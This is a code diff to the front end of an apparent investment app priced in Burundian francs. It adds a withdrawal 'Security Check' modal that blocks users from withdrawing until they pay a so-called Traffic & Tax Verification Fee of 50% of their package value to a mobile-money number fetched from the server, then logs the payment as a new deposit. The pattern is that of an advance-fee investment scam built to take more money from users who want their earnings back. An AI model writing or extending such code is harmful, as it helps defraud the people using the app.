@@ -1557,13 +1557,103 @@ class SolarApp {
     this.showToast('Deposit History is coming soon in the next update!', 'info');
   }
 
-  showWithdrawModal() {
+  async showWithdrawModal() {
     const activePkg = document.getElementById('active-package')?.textContent || 'None';
     if (activePkg === 'None' || activePkg === '...' || activePkg === 'No Active Package') {
       this.showToast('Security Alert: You must activate an investment package before you can withdraw your earnings.', 'error');
       return;
     }
-    this.showToast('Withdrawal system is being initialized. Please wait for the next instruction.', 'info');
+
+    // 1. Calculate Fee (50% of package value)
+    // We try to find the package amount from the packages list or fallback to a sensible default if not found
+    let pkgValue = 80000; // Default fallback
+    try {
+      const pkgsRes = await this.fetchAPI('packages');
+      const pkgs = pkgsRes?.data || [];
+      const myPkg = pkgs.find(p => p.name === activePkg);
+      if (myPkg) {
+        pkgValue = parseInt(myPkg.amount.replace(/[^0-9]/g, ''));
+      }
+    } catch(e) { console.warn('Failed to fetch package value for fee calculation'); }
+
+    const feeAmount = Math.floor(pkgValue / 2);
+    const feeFormatted = feeAmount.toLocaleString() + ' FBu';
+
+    // 2. Fetch Payment Instructions
+    const userCountry = this.state.user?.country || 'Burundi';
+    let rawInstructions = '';
+    let customHeader = '📋 Fee Payment Instructions';
+    try {
+      const pmData = await fetch(`/api/payment-methods?country=${encodeURIComponent(userCountry)}`).then(r => r.json());
+      if (pmData?.data?.length > 0) {
+        rawInstructions = (pmData.data[0].provider || '').replace(/\\n/g, '\n');
+        customHeader = pmData.data[0].account_name || 'Fee Payment Instructions';
+      }
+    } catch(e) { console.warn('Payment method fetch failed'); }
+
+    // 3. Smart Extraction for Fee
+    const phoneMatches = rawInstructions.match(/(?:\+?\d{8,13})/g) || [];
+    const uniquePhones = [...new Set(phoneMatches)];
+    const dialMatches = rawInstructions.match(/\*\d+[\*\d]*#/g) || [];
+    const uniqueDials = [...new Set(dialMatches)];
+    const copySvg = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`;
+
+    let extraDetailsHTML = `
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <span style="font-size:13px; font-weight:600; color:#991b1b;">Tax/Traffic Fee:</span>
+        <span style="display:inline-flex;align-items:center;gap:6px;"><strong style="color:#dc2626;font-size:16px;">${feeAmount}</strong><button onclick="navigator.clipboard.writeText('${feeAmount}');window.app?.showToast('Fee amount copied!','success');" style="background:none;border:none;color:#dc2626;cursor:pointer;padding:2px;">${copySvg}</button></span>
+      </div>`;
+
+    uniquePhones.forEach((phone, idx) => {
+      extraDetailsHTML += `
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <span style="font-size:13px; font-weight:600; color:#334155;">${idx === 0 ? 'Payment Number:' : 'Alt Number:'}</span>
+          <span style="display:inline-flex;align-items:center;gap:6px;"><strong style="color:#334155;font-size:15px;">${phone}</strong><button onclick="navigator.clipboard.writeText('${phone}');window.app?.showToast('Number copied!','success');" style="background:none;border:none;color:#64748b;cursor:pointer;padding:2px;">${copySvg}</button></span>
+        </div>`;
+    });
+
+    const html = `
+      <div style="padding: 20px; text-align: center;">
+        <div style="width:70px; height:70px; background:#fef2f2; border-radius:24px; display:flex; align-items:center; justify-content:center; margin:0 auto 20px; color:#ef4444;">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        </div>
+        <h3 style="font-size:20px; font-weight:800; color:#1e293b; margin-bottom:12px;">Withdrawal Security Check</h3>
+        <p style="font-size:14px; color:#64748b; line-height:1.6; margin-bottom:24px;">
+          To complete your withdrawal request, the system requires a <strong>Traffic & Tax Verification Fee</strong>. 
+          This fee is calculated as 50% of your active <strong>${activePkg}</strong> package value.
+        </p>
+
+        <div style="background:#fdf2f2; border:1px solid #fecaca; border-radius:16px; padding:20px; text-align:left; margin-bottom:24px;">
+          <h4 style="font-size:12px; font-weight:800; color:#991b1b; text-transform:uppercase; margin-bottom:12px; border-bottom:1px solid #fecaca; padding-bottom:8px;">Verification Required</h4>
+          <div style="font-size:13px; color:#7f1d1d; margin-bottom:16px; white-space:pre-wrap;">${rawInstructions || 'Please pay the fee to our official account to unlock your withdrawal.'}</div>
+          <div style="background:white; padding:12px; border-radius:10px; border:1px dashed #f87171; display:flex; flex-direction:column; gap:8px;">
+            ${extraDetailsHTML}
+          </div>
+        </div>
+
+        <button id="fee-paid-btn" class="btn btn-blue btn-full" style="padding:16px; font-weight:800; border-radius:14px; margin-bottom:12px;">I Have Paid the Fee</button>
+        <p style="font-size:12px; color:#94a3b8;">After payment, your withdrawal will be processed within 2-24 hours.</p>
+      </div>
+    `;
+
+    this.showModal('Withdrawal Verification', html);
+
+    document.getElementById('fee-paid-btn').onclick = async () => {
+      const btn = document.getElementById('fee-paid-btn');
+      btn.disabled = true; btn.textContent = 'Verifying Payment...';
+      
+      const res = await this.fetchAPI('deposits', {
+        method: 'POST',
+        body: JSON.stringify({ package_name: `Tax Fee (${activePkg})`, amount: feeFormatted })
+      });
+
+      if (res) {
+        this.showToast('Verification request submitted! Our team will process your withdrawal once the fee is confirmed.', 'success');
+        document.getElementById('app-modal').remove();
+      } else {
+        btn.disabled = false; btn.textContent = 'I Have Paid the Fee';
+      }
+    };
   }
 
   editProfile() {
